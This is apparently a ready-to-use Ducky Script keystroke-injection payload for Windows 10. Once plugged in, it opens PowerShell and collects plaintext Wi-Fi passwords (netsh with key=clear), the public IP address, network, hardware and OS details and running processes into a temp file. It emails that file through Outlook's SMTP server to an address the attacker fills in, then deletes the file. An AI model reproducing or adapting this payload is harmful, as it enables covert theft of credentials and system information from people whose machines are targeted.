REM Title: Email System & User Info (old)
REM Author: @beigeworm
REM Description: Uses Powershell to gather system info and send it via Email.
REM Target: Windows 10

REM *REQUIREMENTS*
REM you will need a Microsoft Outlook Email address for this to work

REM *SETUP*
REM replace EMAIL_HERE and PASSWORD_HERE. (check entire script)

REM =============================================================================

REM some setup for dukie script
LOCALE US
DEFAULT_DELAY 100

REM Open Notepad for credentials
DELAY 1000
GUI r
DELAY 200
STRING notepad
ENTER
DELAY 1000
STRING $From = "EMAIL_HERE"
ENTER
DELAY 250
STRING $To = "EMAIL_HERE"
ENTER
DELAY 250
STRING $Attachment = "C:\temp\dump.txt"
ENTER
DELAY 250
STRING $Subject = "IP Info"
ENTER
DELAY 250
STRING $Body = "yourdetails"
ENTER
DELAY 250
STRING $SMTPServer = "smtp.outlook.com"
ENTER
DELAY 250
STRING $SMTPPort = "587"
ENTER
DELAY 250
STRING Send-MailMessage -From $From -to $To -Subject $Subject `
ENTER
DELAY 250
STRING -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
ENTER
DELAY 250
STRING -Credential (Get-Credential -Credential "EMAIL_HERE") -Attachments $Attachment
DELAY 250
CONTROL a
DELAY 250
CONTROL c
DELAY 250
ALT F4
DELAY 250
ALT n
DELAY 500
GUI r
DELAY 300
STRING powershell
DELAY 100
ENTER
DELAY 1500
STRING netsh wlan show profile name="The Dreadquarters" key=clear | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 1500
STRING (Invoke-WebRequest ifconfig.me/ip).Content.Trim() | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 2000
STRING Get-NetIPConfiguration -All | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 2500
STRING Get-WmiObject -Class Win32_ComputerSystem | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 1500
STRING Get-WmiObject -Class Win32_Processor | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 1500
STRING Get-WmiObject -Class Win32_Desktop | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 2000
STRING Get-WmiObject -Class Win32_OperatingSystem | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 2000
STRING Get-WmiObject Win32_Bios | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 500
STRING Get-WmiObject win32_baseboard | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 1000
STRING Get-WmiObject win32_physicalmemory | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 1000
STRING netsh wlan show profiles | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 1500
STRING netsh wlan  show network  mode=bssid | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 2000
STRING Get-ComputerInfo | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 4000
STRING Get-Process | out-file -filepath C:\temp\dump.txt -append
ENTER
DELAY 5000
CONTROL v
ENTER
DELAY 1000
STRING PASSWORD_HERE
ENTER
DELAY 2500
STRING rm c:/temp/dump.txt
ENTER
DELAY 2500
STRING exit
ENTER
